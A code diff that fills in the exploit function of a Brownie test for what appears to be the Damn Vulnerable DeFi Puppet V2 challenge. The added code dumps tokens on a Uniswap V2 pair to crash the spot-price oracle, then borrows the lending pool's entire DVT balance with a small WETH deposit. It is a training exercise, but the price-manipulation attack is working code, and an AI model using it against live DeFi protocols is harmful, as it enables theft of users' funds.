@@ -12,15 +12,11 @@ from brownie import (accounts,
                      PuppetV2Pool,
                      UniswapV2Pair)
 from brownie.network.state import Chain
+from web3 import Web3
 
 LENDING_POOL_DVT_TOKENS = Wei("1000000 ether")
 UNI_PAIR_DVT = Wei("100 ether")
 UNI_PAIR_ETH = Wei("10 ether")
-
-
-
-    
-
 
 def before():
     global ATTACKER
@@ -50,13 +46,86 @@ def before():
     dv_token.transfer(puppet_pool.address, LENDING_POOL_DVT_TOKENS,
                       {"from": accounts[0]})
 
-    
-
-    
 
 
 def exploit():
-    pass
+    # intiate variables
+    deployer = accounts[0]
+    attacker = ATTACKER
+    token = dv_token
+    lending_pool = puppet_pool
+    uni_factory = UniswapV2Factory[-1]
+    uni_router = UniswapV2Router02[-1]
+    
+    # check the balance of the uniswap pool before the operations
+    print(f'pair: {pair}')
+    reserves = pair.getReserves()
+    reserveToken = Web3.fromWei(reserves[0], "ether")
+    reserveWETH = Web3.fromWei(reserves[1], "ether")
+    print(f'uniswap reserveToken before: {reserveToken}')
+    print(f'uniswap reserveWETH before: {reserveWETH}')
+
+    # check the balances of the attacker before the operation
+    print(f'attacker token balance before: {Web3.fromWei(token.balanceOf(attacker.address), "ether")}')
+    print(f'attacker ETH balance before: {Web3.fromWei(attacker.balance(), "ether")}')
+
+    # quote to buy all tokens in pool (amount = reserve) 
+    quote = Web3.fromWei(uni_router.quote(Web3.toWei(100, "ether"), reserveToken, reserveWETH), "ether")
+    print(f'uniswap quote ETH/token to buy all tokens: {quote}')
+
+    # compute the deposit required to empty the pool
+    depositRequired = lending_pool.calculateDepositOfWETHRequired(LENDING_POOL_DVT_TOKENS)
+    print(f'puppetPool token balance (before): {Web3.fromWei(LENDING_POOL_DVT_TOKENS, "ether")}')
+    print(f'puppetPool WETH deposit require (before): {Web3.fromWei(depositRequired, "ether")}')
+
+    # approve the attacker token to send it to the uniswap pool
+    token.approve(uni_router.address, Web3.toWei(10000, "ether"), {"from": attacker})
+
+    # sell all DVT (10000) to uniswap pool to make the price crash
+    path = [token.address, weth.address]
+    deadline = Chain().time() * 2
+    print(f'path[0]: {path[0]}')
+    print(f'path[1]: {path[1]}')
+    tx = uni_router.swapExactTokensForETH(
+        Web3.toWei(10000, "ether"),
+        1,
+        path,
+        attacker,
+        deadline,
+        {'from': attacker})
+    print(f'uni swap tx 10000 token for weth: {tx}')
+
+    # check the balance of the uniswap pool after the operations
+    reserves = pair.getReserves()
+    reserveToken = Web3.fromWei(reserves[0], "ether")
+    reserveWETH = Web3.fromWei(reserves[1], "ether")
+    print(f'uniswap reserveToken after: {reserveToken}')
+    print(f'uniswap reserveWETH after: {reserveWETH}')
+
+    # check the balances of the attacker after the operation
+    print(f'attacker token balance after: {Web3.fromWei(token.balanceOf(attacker.address), "ether")}')
+    print(f'attacker ETH balance after: {Web3.fromWei(attacker.balance(), "ether")}')
+    print(f'attacker WETH balance after: {Web3.fromWei(weth.balanceOf(attacker.address), "ether")}')
+
+    # transfer 29.5 ETH to WETH to be able to interact with the lending pool contract
+    weth.deposit({'from': attacker, 'value': Web3.toWei(29.5, "ether")})
+    print(f'attacker ETH balance after deposit weth: {Web3.fromWei(attacker.balance(), "ether")}')
+    print(f'attacker WETH balance after deposit weth: {Web3.fromWei(weth.balanceOf(attacker.address), "ether")}')
+
+    # # quote to buy all tokens in pool (amount = reserve) 
+    # quote = Web3.fromWei(uni_router.quote(Web3.toWei(100, "ether"), reserveToken, reserveWETH), "ether")
+    # print(f'uniswap quote ETH/token to buy all tokens: {quote}')
+
+    # compute the deposit required to empty the pool
+    depositRequired = lending_pool.calculateDepositOfWETHRequired(LENDING_POOL_DVT_TOKENS)
+    print(f'puppetPool token balance (after): {Web3.fromWei(LENDING_POOL_DVT_TOKENS, "ether")}')
+    print(f'puppetPool WETH deposit require (after): {Web3.fromWei(depositRequired, "ether")}')
+
+    # approve the attacker WETH to send it to the lending pool
+    weth.approve(lending_pool.address, Web3.toWei(300, "ether"), {"from": attacker})
+
+    # borrow as much DVT as possible from thew puppet pool
+    lending_pool.borrow(LENDING_POOL_DVT_TOKENS, {'from': attacker})
 
 def after():
     assert DamnValuableToken[-1].balanceOf(PuppetV2Pool[-1].address) == 0
